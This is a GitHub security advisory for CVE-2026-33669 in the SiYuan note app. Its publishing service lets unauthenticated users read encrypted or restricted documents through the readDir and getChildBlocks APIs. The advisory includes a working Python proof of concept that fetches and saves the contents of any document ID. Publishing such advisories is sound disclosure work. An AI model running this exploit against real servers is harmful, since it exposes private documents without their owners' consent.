# [C] SiYuan has Arbitrary Document Reading within the Publishing Service

## Summary
Severity: Critical
Advisory: GHSA-34xj-66v3-6j83
CVE: CVE-2026-33669
CWE: CWE-125
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-34xj-66v3-6j83
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
### Details

Document IDs were retrieved via the /api/file/readDir interface, and then the /api/block/getChildBlocks interface was used to view the content of all documents.

### PoC

```python
#!/usr/bin/env python3
"""SiYuan /api/block/getChildBlocks 文档内容读取"""
import requests
import json
import sys

def get_child_blocks(target_url, doc_id):
    """
    调用 SiYuan 的 /api/block/getChildBlocks API 获取文档内容
    """
    url = f"{target_url.rstrip('/')}/api/block/getChildBlocks"
    
    headers = {
        "Content-Type": "application/json"
    }
    
    data = {
        "id": doc_id
    }
    
    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        response.raise_for_status()
        
        result = response.json()
        
        if result.get("code") != 0:
            print(f"[-] 请求失败: {result.get('msg', '未知错误')}")
            return None
        
        return result.get("data")
        
    except requests.exceptions.RequestException as e:
        print(f"[-] 网络请求失败: {e}")
        return None
    except json.JSONDecodeError as e:
        print(f"[-] JSON解析失败: {e}")
        return None

def format_block_content(block):
    """格式化块内容"""
    content = ""
    
    # 获取块内容
    if isinstance(block, dict):
        # 尝试多种可能的字段
        md = block.get("markdown", "") or block.get("content", "") or ""
        if md:
            content = md.strip()
    
    return content

def main():
    """主函数"""
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = input("请输入 SiYuan 服务地址 (例如: http://localhost:6806): ").strip()
        if not target_url:
            target_url = "http://localhost:6806"
    
    print(f"目标地址: {target_url}")
    print("=" * 50)
    
    while True:
        print("\n" + "=" * 50)
        doc_id = input("请输入文档ID (输入 'quit' 或 'exit' 退出): ").strip()
        
        if doc_id.lower() in ['quit', 'exit', 'q']:
            print("程序退出")
            break
        
        if not doc_id:
            print("[-] 文档ID不能为空")
            continue
        
        print(f"\n[*] 正在读取文档: {doc_id}")
        
        blocks = get_child_blocks(target_url, doc_id)
        
        if blocks is None:
            print("[-] 获取文档内容失败")
            continue
        
        if not blocks:
            print(f"[!] 文档 {doc_id} 没有子块或为空")
            continue
        
        print(f"[+] 成功获取 {len(blocks)} 个子块")
        print("-" * 50)
        
        # 保存所有块内容
        all_blocks_content = []
        
        for i, block in enumerate(blocks, 1):
            content = format_block_content(block)
            if content:
                print(content[:200] + ("..." if len(content) > 200 else ""))
                
                all_blocks_content.append({
                    "index": i,
                    "content": content,
                    "raw_block": block
                })
        
        # 询问是否保存到文件
        save_choice = input("\n是否保存到文件? (y/N): ").strip().lower()
        if save_choice in ['y', 'yes']:
            filename = f"doc_{doc_id}_blocks.json"
            try:
                with open(filename, "w", encoding="utf-8") as f:
                    json.dump({
                        "doc_id": doc_id,
                        "block_count": len(blocks),
                        "blocks": all_blocks_content
                    }, f, ensure_ascii=False, indent=2)
                print(f"[+] 已保存到: {filename}")
            except Exception as e:
                print(f"[-] 保存失败: {e}")
        
        print("-" * 50)

if __name__ == "__main__":
    main()
```

<img width="1492" height="757" alt="image" src="https://github.com/user-attachments/assets/2e08a286-dceb-4fd5-87d5-44f39983dcbc" />

### Impact

File reading: All encrypted or prohibited documents under the publishing service could be read.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-34xj-66v3-6j83
- https://nvd.nist.gov/vuln/detail/CVE-2026-33669
- https://github.com/siyuan-note/siyuan
